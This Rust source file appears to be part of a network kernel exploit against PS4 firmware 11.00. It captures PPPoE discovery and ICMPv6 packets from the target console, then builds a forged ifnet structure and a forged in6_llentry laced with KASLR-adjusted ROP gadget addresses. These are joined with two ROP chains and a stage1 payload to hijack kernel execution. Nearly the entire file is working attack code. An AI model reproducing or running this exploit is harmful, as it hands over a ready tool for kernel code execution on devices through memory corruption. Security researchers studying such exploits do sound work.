use crate::constants;

use super::{
    offsets::OFFSETS_FW_1100,
    utils::{build_first_rop, build_second_rop},
};

#[derive(Debug)]
pub struct ExploitState {
    pub source_mac: [u8; 6],
    pub target_mac: [u8; 6],
    pub pppoe_softc: u64,
    pub host_uniq: [u8; 8],
    pub target_ipv6: [u8; 16],
    pub source_ipv6: [u8; 16],
    pub kaslr_offset: u64,
}

impl Default for ExploitState {
    fn default() -> Self {
        ExploitState {
            source_mac: [0; 6],
            target_mac: [0; 6],
            pppoe_softc: 0,
            host_uniq: [0; 8],
            target_ipv6: [0; 16],
            source_ipv6: [0; 16],
            kaslr_offset: 0,
        }
    }
}

pub fn handle_padi(exploit_state: &mut ExploitState, data: &[u8]) {
    // println!("[+] PADI packet received");
    // Extracting Host Unique Tag and populating the self.pppoe_softc
    exploit_state.host_uniq = extract_host_uniq(data).unwrap();
    exploit_state.pppoe_softc = u64::from_le_bytes(exploit_state.host_uniq);
    // Format and print pppoe_softc in hexadecimal format with 0x prefix
    println!("[+] pppoe_softc: 0x{:x}", exploit_state.pppoe_softc);
    // Extract and update source mac
    exploit_state.target_mac = extract_ps4_mac(data).unwrap();
    // Format target MAC in colon-separated hex format
}

pub fn handle_icmpv6_router_sol(exploit_state: &mut ExploitState, data: &[u8]) {
    println!("[+] Waiting for Router Solicitation packet");
    exploit_state.target_ipv6 = data[22..38].try_into().unwrap();
}

fn extract_host_uniq(data: &[u8]) -> Result<[u8; 8], Box<dyn std::error::Error>> {
    let mut result = [0u8; 8];
    // Go to the tags
    let mut offset = constants::ETH_HEADER_LEN + constants::PPPOE_HEADER_LEN;
    // Read all the tags until possible
    while offset + constants::PPPOE_TAG_HEADER_LEN <= data.len() {
        // Read Header
        let tag_type = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let tag_len = u16::from_be_bytes([data[offset + 2], data[offset + 3]]) as usize;
        offset += constants::PPPOE_TAG_HEADER_LEN;
        if tag_type == constants::PPPOE_TAG_HOST_UNIQ && offset + tag_len <= data.len() {
            // Extract the Host-Uniq tag value
            let host_uniq = &data[offset..offset + tag_len];
            if tag_len == 8 {
                // If Host-Uniq is expected to be a 64-bit integer, interpret it as Big-Endian
                result.copy_from_slice(host_uniq);
                // println!("[+] Extracted Host-Uniq: {:?}", result);
                break;
            }
        }
        // Go to next tag
        offset += tag_len;
    }
    Ok(result)
}

fn extract_ps4_mac(data: &[u8]) -> Result<[u8; 6], Box<dyn std::error::Error>> {
    // Extract the source MAC address
    let offset = constants::ETH_SOURCE_MAC;
    let mac_bytes = &data[offset..offset + 6];
    // Create a 6-byte array and copy the data into it
    let mut mac_address = [0u8; 6];
    mac_address.copy_from_slice(mac_bytes);
    Ok(mac_address)
}

pub fn build_fake_ifnet(exploit_state: &mut ExploitState) -> Vec<u8> {
    let planted = (exploit_state.pppoe_softc + 0x07) & 0xffffffffffff; // Add 7 and truncate to 48
    let planted_bytes = planted.to_be_bytes();
    let truncated_bytes: [u8; 6] = planted_bytes[2..8]
        .try_into()
        .expect("slice with incorrect length");
    exploit_state.source_mac = truncated_bytes;
    exploit_state.source_mac.reverse(); // For endianness TODO make this agnostic

    print_current_state(exploit_state);
    // Fake ifnet
    let mut fake_ifnet = vec![0x41; 0x48]; // Fill with 'A' initially
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // if_addrhead
    fake_ifnet.resize(0x70, 0x41); // Fill to 0x70 with 'A'
    fake_ifnet.extend(&0x0001u16.to_le_bytes()); // if_index
    fake_ifnet.resize(0xa0, 0x41); // Fill to 0xa0 with 'A'
    fake_ifnet.push(constants::IFT_ETHER); // ifi_type
    fake_ifnet.push(0); // ifi_physical
    fake_ifnet.push(0x8 + 0x1); // ifi_addrlen
    fake_ifnet.resize(0x1b8, 0x41); // Fill to 0x1b8 with 'A'

    fake_ifnet.extend(&(exploit_state.pppoe_softc + constants::PPPOE_SOFTC_SC_DEST).to_le_bytes()); // if_addr
    fake_ifnet.resize(0x428, 0x41); // Fill to 0x428 with 'A'
    fake_ifnet.extend(&(exploit_state.pppoe_softc + 0x10 - 0x8).to_le_bytes()); // nd_ifinfo
                                                                                // if_afdata_lock

    fake_ifnet.resize(0x480, 0x41); // Fill to 0x480 with 'A'
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::RW_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                              // if_addr_mtx

    fake_ifnet.resize(0x4c0, 0x41); // Fill to 0x4c0 with 'A'

    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::MTX_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::MTX_UNOWNED.to_le_bytes()); // mtx_lock
    fake_ifnet
}

pub fn build_fake_lle(exploit_state: &mut ExploitState, stage1: &Vec<u8>) -> Vec<u8> {
    let planted = (exploit_state.kaslr_offset + OFFSETS_FW_1100.first_gadget) & 0xffffffffffff;
    exploit_state.source_mac = planted.to_le_bytes()[..6].try_into().unwrap();
    // Format source MAC in colon-separated hex format
    print_current_state(exploit_state);

    // Fake in6_llentry
    let mut fake_lle = vec![0x00; 0x00]; // Initiaslize empty byte array
                                         // lle_next (Third gadget)
    let lle_next = (exploit_state.kaslr_offset
        + OFFSETS_FW_1100.pop_rbx_pop_r14_pop_rbp_jmp_qword_ptr_rsi_10)
        .to_le_bytes();
    fake_lle.extend(&lle_next);
    fake_lle.extend(&0u64.to_le_bytes()); // lle_prev (NULL)
                                          // lle_lock (Fourth gadget)
    let lle_lock =
        (exploit_state.kaslr_offset + OFFSETS_FW_1100.lea_rsp_rsi_20_repz_ret).to_le_bytes();
    fake_lle.extend(&lle_lock);
    let lo_flags = (constants::RW_INIT_FLAGS | constants::LO_DUPOK).to_le_bytes();
    fake_lle.extend(&lo_flags);
    fake_lle.extend(&0u32.to_le_bytes()); // lo_data
    let lo_witness =
        (exploit_state.kaslr_offset + OFFSETS_FW_1100.add_rsp_b0_pop_rbp_ret).to_le_bytes();
    fake_lle.extend(&lo_witness);
    fake_lle.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                            // lle_tbl
    let lle_tbl = (exploit_state.pppoe_softc + constants::PPPOE_SOFTC_SC_DEST
        - constants::LLTABLE_LLTFREE)
        .to_le_bytes();
    fake_lle.extend(&lle_tbl);
    fake_lle.extend(&0u64.to_le_bytes()); // lle_head (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // lle_free (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // la_hold (NULL)
    fake_lle.extend(&0u32.to_le_bytes()); // la_numheld
    fake_lle.extend(&0u32.to_le_bytes()); // pads
    fake_lle.extend(&0u64.to_le_bytes()); // la_expire
    let la_flags = (constants::LLE_STATIC | constants::LLE_EXCLUSIVE).to_le_bytes();
    fake_lle.extend(&la_flags);
    fake_lle.extend(&0u16.to_le_bytes()); // la_asked
    fake_lle.extend(&0u16.to_le_bytes()); // la_preempt
    fake_lle.extend(&0u16.to_le_bytes()); // ln_byhint
    let ln_state = constants::ND6_LLINFO_NOSTATE.to_le_bytes();
    fake_lle.extend(&ln_state);
    fake_lle.extend(&0u16.to_le_bytes()); // ln_router
    fake_lle.extend(&0u32.to_le_bytes()); // pad
    fake_lle.extend(&0x7fffffffffffffffu64.to_le_bytes()); // ln_ntick
    fake_lle.extend(&0u32.to_le_bytes()); // lle_refcnt
    fake_lle.extend(&0u32.to_le_bytes()); // pad
                                          // ll_addr (big-endian)
    let ll_addr = 0x414141414141u64.to_be_bytes();
    fake_lle.extend(&ll_addr);
    // lle_timer
    fake_lle.extend(&0u64.to_le_bytes()); // sle
    fake_lle.extend(&0u64.to_le_bytes()); // tqe
    fake_lle.extend(&0u32.to_le_bytes()); // c_time
    fake_lle.extend(&0u32.to_le_bytes()); // pad
    fake_lle.extend(&0u64.to_le_bytes()); // c_arg (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // c_func (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // c_lock (NULL)
    let c_flags = constants::CALLOUT_RETURNUNLOCKED.to_le_bytes();
    fake_lle.extend(&c_flags);
    fake_lle.extend(&0u32.to_le_bytes()); // c_cpu
                                          // l3_addr6
    let sin6_len = constants::SOCKADDR_IN6_SIZE.to_le_bytes();
    fake_lle.extend(&sin6_len);
    let sin6_family = constants::AF_INET6.to_le_bytes();
    fake_lle.extend(&sin6_family);
    fake_lle.extend(&0u16.to_le_bytes()); // sin6_port
    fake_lle.extend(&0u32.to_le_bytes()); // sin6_flowinfo
    let sin6_addr = 0xfe80000100000000u64.to_be_bytes();
    fake_lle.extend(&sin6_addr);
    let sin6_addr_2 = 0x4141414141414141u64.to_be_bytes();
    fake_lle.extend(&sin6_addr_2);
    fake_lle.extend(&0u32.to_le_bytes()); // sin6_scope_id

    // Pad
    fake_lle.extend(&0u32.to_le_bytes());

    // Second gadget
    let second_gadget = exploit_state.kaslr_offset + OFFSETS_FW_1100.push_rbp_jmp_qword_ptr_rsi;
    let start: usize = OFFSETS_FW_1100.second_gadget_off.try_into().unwrap();
    let end: usize = (OFFSETS_FW_1100.second_gadget_off + 8).try_into().unwrap();
    fake_lle[start..end].copy_from_slice(&second_gadget.to_le_bytes());

    // Second ROP chain
    let rop2 = build_second_rop(exploit_state.kaslr_offset, stage1.len());
    // First ROP chain
    let rop = build_first_rop(stage1.len(), &fake_lle, &rop2, exploit_state.kaslr_offset);

    // Return the combined fake lle and ROP chains
    [fake_lle, rop, rop2, stage1.clone()].concat()
}

pub fn print_current_state(exploit_state: &ExploitState) {
    // Format MAC addresses
    println!("------------------------------------------");
    let target_mac_str = exploit_state
        .target_mac
        .iter()
        .map(|byte| format!("{:02x}", byte))
        .collect::<Vec<String>>()
        .join(":");
    println!("[+] Target MAC: {}", target_mac_str);
    let source_mac_str = exploit_state
        .source_mac
        .iter()
        .map(|byte| format!("{:02x}", byte))
        .collect::<Vec<String>>()
        .join(":");
    println!("[+] Source MAC: {}", source_mac_str);
    // Format IPv6 addresses
    let target_ipv6_str = exploit_state
        .target_ipv6
        .chunks(2)
        .map(|chunk| format!("{:02x}{:02x}", chunk[0], chunk[1]))
        .collect::<Vec<String>>()
        .join(":");
    println!("[+] Target IPv6: {}", target_ipv6_str);
    let source_ipv6_str = exploit_state
        .source_ipv6
        .chunks(2)
        .map(|chunk| format!("{:02x}{:02x}", chunk[0], chunk[1]))
        .collect::<Vec<String>>()
        .join(":");
    println!("[+] Source IPv6: {}", source_ipv6_str);
    // Print the PPPoE softc and KASLR offset
    println!("[+] PPPoE softc: {:#x}", exploit_state.pppoe_softc);
    println!("[+] KASLR Offset: {:#x}", exploit_state.kaslr_offset);
    println!("------------------------------------------");
}
